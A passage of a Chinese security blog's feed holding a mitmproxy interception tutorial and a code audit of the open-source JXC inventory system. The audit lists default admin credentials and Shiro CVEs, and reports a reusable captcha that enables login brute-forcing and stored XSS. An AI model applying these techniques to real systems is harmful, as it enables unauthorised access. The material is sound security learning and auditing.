        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>在学习 Mitmproxy 前首先我们得先了解一下 Mitmproxy 的功能作用是什么，然后我们利用它能在实际的测试中能帮助我们解决什么问题。</p><br/><h3 id="Mitmproxy-简介"><a href="#Mitmproxy-简介" class="headerlink" title="Mitmproxy 简介"></a>Mitmproxy 简介</h3><p>Mitmproxy 是一款开源的抓包工具，支持SSL的 HTTP 代理，它可以用于调试 HTTP 通信，发起中间人攻击等，不同于 Fiddler 等抓包工具，Mitmproxy 不仅可以截获请求、帮助开发者查看、分析数据包，使用者还可以通过自定义的 Python 脚本进行二次开发，以达到自己的使用需求。</p><br/><h3 id="Mitmproxy-解决的问题"><a href="#Mitmproxy-解决的问题" class="headerlink" title="Mitmproxy 解决的问题"></a>Mitmproxy 解决的问题</h3><p>有时候使用 Burp 进行代理，由于安全设备或者不明原因导致无法抓取到数据包，这时候可以尝试使用 Mitmproxy 进行中间人代理，先把流量代理到 Mitmproxy 再由 Mitmproxy 转发到 Burp 上。在工作上有一次在测试一个站点时无法通过 Burp 进行流量抓取，后来通过公司的一位 “文艺青年” 同事获悉是因为该站点使用了国密算法，<code>SM2的某个密钥算法不兼容 JAVA SDK</code>,并给出了解决方案，<font color=#c3dbe8>Mitmproxy 中间人代理</font>，解决了使用了国密算法无法通过 Burp 抓包的问题。。</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p>Mitmproxy 官方提供了两种安装方式：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">官方直接下载安装包直接 install 安装，网址 https://mitmproxy.org/</span><br><span class="line">通过 Python 安装。本文采取后者安装方法</span><br></pre></td></tr></table></figure></div><br/><p>首先安装好 Python 版本需要不低于 3.6，且安装了附带的包管理工具 pip，这里不再赘述，自行安装。本人环境使用的是 Python 3.9.11。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install mitmproxy</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211134605136.png" data-caption="image-20221211134605136"><img src="/../images/tools/mitmproxy/image-20221211134605136.png" alt="image-20221211134605136"></a><br><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211134655595.png" data-caption="image-20221211134655595"><img src="/../images/tools/mitmproxy/image-20221211134655595.png" alt="image-20221211134655595"></a></p><p>查看版本是否成功安装</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmdump --version</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211134826164.png" data-caption="image-20221211134826164"><img src="/../images/tools/mitmproxy/image-20221211134826164.png" alt="image-20221211134826164"></a></p><h2 id="三、Mitmproxy-使用"><a href="#三、Mitmproxy-使用" class="headerlink" title="三、Mitmproxy 使用"></a>三、Mitmproxy 使用</h2><p>Mitmproxy 有三种启动命令 <code>mitmproxy</code>、<code>mitmdump</code>、<code>mitmweb</code>,任意一种命令均可启动软件，区别是交互界面的不同。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 命令      | 功能                   |</span><br><span class="line">| --------- | ---------------------- |</span><br><span class="line">| mitmproxy | 提供命令行界面         |</span><br><span class="line">| mitmdump  | 提供一个简单的终端输出 |</span><br><span class="line">| mitmweb   | 提供在线浏览器抓包界面 |</span><br></pre></td></tr></table></figure></div><p>开始使用前首先安装 mitmproxy 证书，cmd 直接输入 <code>mitmproxy</code> 启动软件，默认会监听 <a href="http://localhost:8080/">http://localhost:8080</a> ,然后访问 <a href="http://mitm.it/">http://mitm.it/</a> 安装证书。出现下图则代理设置没有成功。</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141155354.png" data-caption="image-20221211141155354"><img src="/../images/tools/mitmproxy/image-20221211141155354.png" alt="image-20221211141155354"></a></p><p>设置系统代理，点击保存</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141430394.png" data-caption="image-20221211141430394"><img src="/../images/tools/mitmproxy/image-20221211141430394.png" alt="image-20221211141430394"></a></p><p>再次访问 <a href="http://mitm.it/">http://mitm.it/</a> 选择对应的证书进行安装即可。</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141300248.png" data-caption="image-20221211141300248"><img src="/../images/tools/mitmproxy/image-20221211141300248.png" alt="image-20221211141300248"></a></p><p>安装证书</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141856418.png" data-caption="image-20221211141856418"><img src="/../images/tools/mitmproxy/image-20221211141856418.png" alt="image-20221211141856418"></a></p><p>密码无需填写</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211141935950.png" data-caption="image-20221211141935950"><img src="/../images/tools/mitmproxy/image-20221211141935950.png" alt="image-20221211141935950"></a></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211142028689.png" data-caption="image-20221211142028689"><img src="/../images/tools/mitmproxy/image-20221211142028689.png" alt="image-20221211142028689"></a></p><h3 id="1、mitmproxy"><a href="#1、mitmproxy" class="headerlink" title="1、mitmproxy"></a>1、mitmproxy</h3><p>cmd 命令行输入 <code>mitmproxy</code> 开启抓包</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211142249404.png" data-caption="image-20221211142249404"><img src="/../images/tools/mitmproxy/image-20221211142249404.png" alt="image-20221211142249404"></a></p><p>点击数据包可查看具体响应,点击 <code>q</code> 返回主页</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211142409754.png" data-caption="image-20221211142409754"><img src="/../images/tools/mitmproxy/image-20221211142409754.png" alt="image-20221211142409754"></a></p><p>也可以指定端口进行监听：<code>mitmproxy --listen-port 9000</code> （mitmproxy -p 9000 亦可）</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221230171902531.png" data-caption="image-20221230171902531"><img src="/../images/tools/mitmproxy/image-20221230171902531.png" alt="image-20221230171902531"></a></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211143116722.png" data-caption="image-20221211143116722"><img src="/../images/tools/mitmproxy/image-20221211143116722.png" alt="image-20221211143116722"></a></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211143207912.png" data-caption="image-20221211143207912"><img src="/../images/tools/mitmproxy/image-20221211143207912.png" alt="image-20221211143207912"></a></p><h3 id="2、mitmdump"><a href="#2、mitmdump" class="headerlink" title="2、mitmdump"></a>2、mitmdump</h3><p>录制回放请求，此命令无法查看具体的请求数据，只是默默运行在后台，所以一般不使用此命令。</p><p>通过命令：<code>mitmdump -w dump.txt</code> 可将 8080 端口的请求录制在 <code>dump.txt</code> 文件中</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211145658121.png" data-caption="image-20221211145658121"><img src="/../images/tools/mitmproxy/image-20221211145658121.png" alt="image-20221211145658121"></a></p><p>然后通过命令: <code>mitmdump -nC dump.txt</code> 进行回放请求</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211145820595.png" data-caption="image-20221211145820595"><img src="/../images/tools/mitmproxy/image-20221211145820595.png" alt="image-20221211145820595"></a></p><h3 id="3、mitmweb"><a href="#3、mitmweb" class="headerlink" title="3、mitmweb"></a>3、mitmweb</h3><p>此命令能为用户提供 web 端界面，相对比较友好。</p><p>指定 <code>8080</code> 为监听端口，<code>Web server listening at http://127.0.0.1:8081/</code>,开启命令后会自动打开 web 端 </p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211150024961.png" data-caption="image-20221211150024961"><img src="/../images/tools/mitmproxy/image-20221211150024961.png" alt="image-20221211150024961"></a></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211150131731.png" data-caption="image-20221211150131731"><img src="/../images/tools/mitmproxy/image-20221211150131731.png" alt="image-20221211150131731"></a></p><p>界面相对友好，清晰可见</p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211150204910.png" data-caption="image-20221211150204910"><img src="/../images/tools/mitmproxy/image-20221211150204910.png" alt="image-20221211150204910"></a></p><h2 id="四、扩展"><a href="#四、扩展" class="headerlink" title="四、扩展"></a>四、扩展</h2><h3 id="1、自定义开发脚本"><a href="#1、自定义开发脚本" class="headerlink" title="1、自定义开发脚本"></a>1、自定义开发脚本</h3><p>自定义脚本可以实现拦截请求，从而对请求头、请求、响应、响应头进行修改的效果。当人操作时，就能在拦截请求进行处理的时候进行数据处理</p><p>编写一个 Python 文件通过 mitmproxy 加载，文件定义了变量 addons，addons 是个数组，每个元素是一个类实例，这些类有若干方法，这些方法实现了某些 mitmproxy 提供的事件，mitmproxy 会在某个事件发生时调用对应的方法。这些类，称为一个个 <code>addon</code>，比如一个叫 Counter 的 addon(插件)，更多脚本请查看<a href="https://github.com/mitmproxy/mitmproxy/tree/main/mitmproxy/addons">官方内置 addon</a></p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mitmproxy.http</span><br><span class="line"><span class="keyword">from</span> mitmproxy <span class="keyword">import</span> ctx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Counter</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.num = <span class="number">0</span></span><br><span class="line"><span class="comment"># 重写指定方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, flow: mitmproxy.http.HTTPFlow</span>):</span><br><span class="line">        self.num = self.num + <span class="number">1</span></span><br><span class="line">        ctx.log.info(<span class="string">&quot;We&#x27;ve seen %d flows&quot;</span> % self.num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addons = [</span><br><span class="line">    Counter()</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div><p>将脚本保存为 addons.py ，重新启动 mitmproxy: <code>mitmweb -s addons.py</code></p><p><a data-fancybox="gallery" data-src="/../images/tools/mitmproxy/image-20221211210114217.png" data-caption="image-20221211210114217"><img src="/../images/tools/mitmproxy/image-20221211210114217.png" alt="image-20221211210114217"></a></p><h3 id="2、其他命令"><a href="#2、其他命令" class="headerlink" title="2、其他命令"></a>2、其他命令</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mitmdump -w outfile #截获的数据保存到文件中</span><br><span class="line">mitmdump -s script.py #指定一个脚本来处理截获的数据</span><br></pre></td></tr></table></figure></div><h2 id="五、更新"><a href="#五、更新" class="headerlink" title="五、更新"></a>五、更新</h2><h3 id="20241128"><a href="#20241128" class="headerlink" title="20241128"></a>20241128</h3><blockquote><p>转发手机流量至burp</p></blockquote><p>1、mitmproxy 启动监听</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitmproxy --listen-host 192.168.140.193 -p 9001 --mode upstream:http://127.0.0.1:8080 --ssl-insecure</span><br></pre></td></tr></table></figure></div><p>2、手机设置代理后，访问 <a href="http://mitm.it/">http://mitm.it</a> 安装证书</p><p>3、burp正常开启8080代理</p><p>![image-20241128142207054](E:\Security file\learning notes\images\image-20241128142207054.png)</p><p>![image-20241128142608418](E:\Security file\learning notes\images\image-20241128142608418.png)</p><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/zhangmingyan/p/11358886.html</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzI2NjcxNTg0Nw==&amp;mid=2247483709&amp;idx=1&amp;sn=b2b237d5354a9c691a803a371df51ed0&amp;chksm=ea889695ddff1f832200c9edb5fcc2c5169dc4c11ddf0fe6e210196fc293f58ee974769756fb&amp;scene=126&amp;&amp;sessionid=1670738515#rd</span><br><span class="line">https://docs.mitmproxy.org/stable/mitmproxytutorial-replayrequests/</span><br><span class="line">https://ptorch.com/docs/10/mitmproxytutorial-replayrequests</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mitmproxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计(五)-JXC企业级进销存管理系统</title>
      <link href="/2022/12/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%94)-JXC%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2022/12/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%94)-JXC%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%BF%9B%E9%94%80%E5%AD%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>JXC 企业级进销存管理系统，采用 SpringBoot+Shiro+MyBatis+EasyUI，项目采用 Maven 构建，数据库文件存放在 sql&#x2F;jxc.sql。项目地址：<a href="https://github.com/wangjiangfei/JXC">https://github.com/wangjiangfei/JXC</a></p><h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>1、利用 PHPstudy 中的 Mysql 作为数据库</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126134752778.png" data-caption="image-20221126134752778"><img src="/../images/Java/jxc/image-20221126134752778.png" alt="image-20221126134752778"></a></p><p>这里使用 navicat 进行数据库操作，比较直观一点，创建名为 jxc 的数据库</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126135324816.png" data-caption="image-20221126135324816"><img src="/../images/Java/jxc/image-20221126135324816.png" alt="image-20221126135324816"></a></p><p>导入源码中的 &#x2F;sql&#x2F;jxc.sql 文件</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126135554168.png" data-caption="image-20221126135554168"><img src="/../images/Java/jxc/image-20221126135554168.png" alt="image-20221126135554168"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126151230703.png" data-caption="image-20221126151230703"><img src="/../images/Java/jxc/image-20221126151230703.png" alt="image-20221126151230703"></a></p><p>2、IDEA 导入源码，注意导入的是源码是文件夹里面的 jxc 目录，否则双层目录项目会运行不起来</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126162720625.png" data-caption="image-20221126162720625"><img src="/../images/Java/jxc/image-20221126162720625.png" alt="image-20221126162720625"></a></p><p>导入项目后 Maven 会自动加载依赖，然后配置数据库账号密码</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126163003323.png" data-caption="image-20221126163003323"><img src="/../images/Java/jxc/image-20221126163003323.png" alt="image-20221126163003323"></a></p><p>运行即可启动项目</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126163415477.png" data-caption="image-20221126163415477"><img src="/../images/Java/jxc/image-20221126163415477.png" alt="image-20221126163415477"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126163612166.png" data-caption="image-20221126163612166"><img src="/../images/Java/jxc/image-20221126163612166.png" alt="image-20221126163612166"></a></p><p>访问 8080 端口登录后台，账号密码为：admin&#x2F;admin123</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126163955805.png" data-caption="image-20221126163955805"><img src="/../images/Java/jxc/image-20221126163955805.png" alt="image-20221126163955805"></a></p><h2 id="三、代码审计"><a href="#三、代码审计" class="headerlink" title="三、代码审计"></a>三、代码审计</h2><h3 id="1、pom-xml-框架审计"><a href="#1、pom-xml-框架审计" class="headerlink" title="1、pom.xml 框架审计"></a>1、pom.xml 框架审计</h3><p>项目使用 Maven 添加依赖，审计 pom.xml 分析其项目框架，得知项目使用了如下框架</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| 框架名称     | 版本号         |</span><br><span class="line">| ----------- | ------------- |</span><br><span class="line">| Spring-Boot | 2.1.0.RELEASE |</span><br><span class="line">| Mybatis     | 1.3.2         |</span><br><span class="line">| Mysql       | 5.1.40        |</span><br><span class="line">| Shiro       | 1.4.0         |</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126203907217.png" data-caption="image-20221126203907217"><img src="/../images/Java/jxc/image-20221126203907217.png" alt="image-20221126203907217"></a></p><p>项目使用了 Shiro 1.4.0 版本，我们知道 Shiro 框架是存在多个漏洞的，我们通过 Google serach 其历史漏洞，通过查找得知部分 Shiro 历史漏洞如下:</p><table><thead><tr><th>版本</th><th>漏洞</th></tr></thead><tbody><tr><td>Shiro &lt; 1.2.5</td><td>CVE-2016-4437（Apache Shiro 反序列化漏洞）</td></tr><tr><td>Shiro &lt; 1.5.2</td><td>CVE-2020-11989（Apache Shiro 权限绕过）</td></tr><tr><td>Shiro &lt; 1.5.3</td><td>CVE-2020-1957 （Apache Shiro 权限绕过漏洞）</td></tr><tr><td>Apache Shiro 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1</td><td>CVE-2016-4437（Shiro-721 Apache Shiro 反序列化漏洞）</td></tr></tbody></table><br/><h3 id="2、代码审计"><a href="#2、代码审计" class="headerlink" title="2、代码审计"></a>2、代码审计</h3><p>通过访问后台，我们发现这些功能点与平时实战遇到的项目大同小异，我们可以通过审计功能点代码进行挖掘漏洞</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126213111483.png" data-caption="image-20221126213111483"><img src="/../images/Java/jxc/image-20221126213111483.png" alt="image-20221126213111483"></a></p><p>审计初期，先初略通读一下代码，了解其代码结构及其功能点。通读过后，一般没开发经验的其实也是一脸懵，所以我们可以考虑定点审计，比如审计SQL注入，我们只需要搜索特定的关键字，然后再分析其代码是否存在漏洞比较快速。</p><br/><hr><h4 id="Shiro-权限绕过（不存在）"><a href="#Shiro-权限绕过（不存在）" class="headerlink" title="Shiro 权限绕过（不存在）"></a>Shiro 权限绕过（不存在）</h4><p>我们知道 Shiro 框架本身是用来作身份认证和权限管理的一款框架，其通过拦截器功能来实现对用户访问权限的控制和拦截，Shiro 中常见的拦截器有 anon、authc 拦截器。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anon 为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口；</span><br><span class="line">authc 为登录拦截器，需要登录认证才能访问的资源，需要在配置文件配置需要登录的 URL 路径；</span><br></pre></td></tr></table></figure></div><p>authc 拦截器匹配规则如下：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 通配符 | 说明                  |</span><br><span class="line">| ------ | ------------------- |</span><br><span class="line">| ？     | 匹配任意一个字符       |</span><br><span class="line">| *      | 匹配任意字符，包括0个   |</span><br><span class="line">| **     | 匹配任意层路径，包括0个 |</span><br></pre></td></tr></table></figure></div><p>通过分析我们知道该 Shiro 版本可能存在权限绕过漏洞，那我们就转到 Shiro 配置文件审计其代码，文件名为 <code>ShiroConfig.java</code>，通过审计代码可知，系统对 <code>/static/**</code>,<code>/user/login</code>,<code>/drawImage</code> 使用了 anon 拦截器，即对这几个路径不会进行拦截，无需权限即可访问；对 <code>/**</code> 使用了 authc 拦截器，即对任意层路径进行拦截，需进行权限认证。综合得知，除了<code>/static/**</code>,<code>/user/login</code>,<code>/drawImage</code> 路径不需要认证，其他均需要权限认证。</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221126211906103.png" data-caption="image-20221126211906103"><img src="/../images/Java/jxc/image-20221126211906103.png" alt="image-20221126211906103"></a></p><p>综上分析得知，开发者对 <code>/**</code> (任意层路径)使用了 authc 拦截器进行了拦截，所以该项目不存在 Shiro 权限绕过漏洞。</p><hr><h4 id="SQL注入（不存在）"><a href="#SQL注入（不存在）" class="headerlink" title="SQL注入（不存在）"></a>SQL注入（不存在）</h4><p>由上面的 pom.xml 审计中，我们发现系统使用 Mybatis 框架，通过以往的文章学习，我们知道 Mybatis 审计 SQL 注入关键点在与语句是否使用了 <code>$&#123;&#125;</code> 和 <code>#&#123;&#125;</code>,若使用了<code>#&#123;&#125;</code> 即采取了预编译，则是不存在注入了，若使用了 <code>$&#123;&#125;</code> 则为直接拼接，如果不存在过滤则可能存在SQL注入。</p><p>在 Spring Boot 框架中，一般为 Controller 层接收前端请求然后调用 Service 层，然后 Service 层的业务逻辑去调用 Dao 访问数据库做增删改查操作，Dao 再调用 resources 中的对应的 .xml 文件做具体的 SQL 语句，SQL 语句都是在 .xml 文件中写的，而不是在 Java 代码中直接利用 Connection 连接数据库进行查询，这样层次更清晰，代码也更容易维护。因为具体的 SQL 语句都在 .xml 文件中，所以我们审计时可以直接搜索 .xml 文件中是否存在的 ${ 符号，以快速寻找是否存在 SQL 注入漏洞。</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128103655415.png" data-caption="image-20221128103655415"><img src="/../images/Java/jxc/image-20221128103655415.png" alt="image-20221128103655415"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128103844420.png" data-caption="image-20221128103844420"><img src="/../images/Java/jxc/image-20221128103844420.png" alt="image-20221128103844420"></a></p><br/><hr><h4 id="验证码绕过（存在）"><a href="#验证码绕过（存在）" class="headerlink" title="验证码绕过（存在）"></a>验证码绕过（存在）</h4><p>审计验证码是否可绕过，我们先定位其路由，然后根据其位置一步步分析其代码是否存在验证码绕过的可能。我们通过抓包定位其路由为 <code>/user/login</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128105602081.png" data-caption="image-20221128105602081"><img src="/../images/Java/jxc/image-20221128105602081.png" alt="image-20221128105602081"></a></p><p>所以 IDEA 中搜索 <code>/user</code> 或者<code>/login</code> 定位到该位置</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128110144473.png" data-caption="image-20221128110144473"><img src="/../images/Java/jxc/image-20221128110144473.png" alt="image-20221128110144473"></a></p><p>通过审计定位到代码为 Controller 层的 <code>UserController.java</code>，有两个参数，通过上面注释可知道，session 用于取出系统生成的验证码。两个参数使用 <code>login</code> 方法去调用，我们跟进 <code>login</code> 方法进一步审计</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128111023068.png" data-caption="image-20221128111023068"><img src="/../images/Java/jxc/image-20221128111023068.png" alt="image-20221128111023068"></a></p><p><code>Ctrl + 鼠标左键</code> 跟进方法，我们来到了 <code>Service</code> 接口层，也就是 <code>Dao</code> 层的 UserService.java，因为 Service 接口调用的是 Dao 层的接口，接下来我们就应该找接口的具体实现代码进行审计</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128111444927.png" data-caption="image-20221128111444927"><img src="/../images/Java/jxc/image-20221128111444927.png" alt="image-20221128111444927"></a></p><p><code>Ctrl + 鼠标左键</code> UserService 接口，找到具体的实现代码</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128111929222.png" data-caption="image-20221128111929222"><img src="/../images/Java/jxc/image-20221128111929222.png" alt="image-20221128111929222"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128111953407.png" data-caption="image-20221128111953407"><img src="/../images/Java/jxc/image-20221128111953407.png" alt="image-20221128111953407"></a></p><p>接下来的工作就是审计该代码即可，通过审计我们得知 <code>if(!userLogin)</code> 如果、非，即如果输出的验证码非系统验证码则返回 ServiceVO 里面的错误，正确则跳进下一步进行登录校验。这里的代码没有定义刷新验证码机制，使我们只需要输入一次正确的验证码即可继续使用该验证码。</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 校验图片验证码是否正确</span></span><br><span class="line"><span class="keyword">if</span>(!userLogin.getImageCode().toUpperCase().equals(session.getAttribute(<span class="string">&quot;checkcode&quot;</span>)))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ServiceVO</span>(ErrorCode.VERIFY_CODE_ERROR_CODE, ErrorCode.VERIFY_CODE_ERROR_MESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128112759128.png" data-caption="image-20221128112759128"><img src="/../images/Java/jxc/image-20221128112759128.png" alt="image-20221128112759128"></a></p><p>漏洞复现，我们输入正确的验证码，抓包进行爆破</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128114103675.png" data-caption="image-20221128114103675"><img src="/../images/Java/jxc/image-20221128114103675.png" alt="image-20221128114103675"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128114130277.png" data-caption="image-20221128114130277"><img src="/../images/Java/jxc/image-20221128114130277.png" alt="image-20221128114130277"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128114152465.png" data-caption="image-20221128114152465"><img src="/../images/Java/jxc/image-20221128114152465.png" alt="image-20221128114152465"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128114229865.png" data-caption="image-20221128114229865"><img src="/../images/Java/jxc/image-20221128114229865.png" alt="image-20221128114229865"></a></p><br/><hr><h4 id="存储型XSS（存在）"><a href="#存储型XSS（存在）" class="headerlink" title="存储型XSS（存在）"></a>存储型XSS（存在）</h4><p>我们知道只要存在输入点，就有可能存在 XSS 漏洞，所以审计时我们首先审计是否存在XSS全局过滤器。一般搜索 filter 进行分析，这里我们知道使用的是 Spring boot 框架并使用了 Shiro，所以我们直接转到 Shiro 中的 filter 过滤器查看是否对 XSS 进行了过滤。</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128125843474.png" data-caption="image-20221128125843474"><img src="/../images/Java/jxc/image-20221128125843474.png" alt="image-20221128125843474"></a></p><p>通过分析，发现系统只对部分的路径进行了过滤，并没有对XSS进行过滤</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130003820.png" data-caption="image-20221128130003820"><img src="/../images/Java/jxc/image-20221128130003820.png" alt="image-20221128130003820"></a></p><p>这时，我们就可以尝试在功能点处输入 XSS 语句进行尝试，查看是否能触发漏洞。首先我们在页面搜索功能点并不能触发漏洞</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130137222.png" data-caption="image-20221128130137222"><img src="/../images/Java/jxc/image-20221128130137222.png" alt="image-20221128130137222"></a></p><p>经过测试，我们发现在系统的搜索功能并不能触发 XSS，在修改功能，可以将数据插入数据库的功能可触发漏洞</p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130626302.png" data-caption="image-20221128130626302"><img src="/../images/Java/jxc/image-20221128130626302.png" alt="image-20221128130626302"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jxc/image-20221128130607082.png" data-caption="image-20221128130607082"><img src="/../images/Java/jxc/image-20221128130607082.png" alt="image-20221128130607082"></a></p><p>进一步测试发现，只要是插入数据库的功能点都能触发漏洞</p><p><a data-fancybox="gallery" 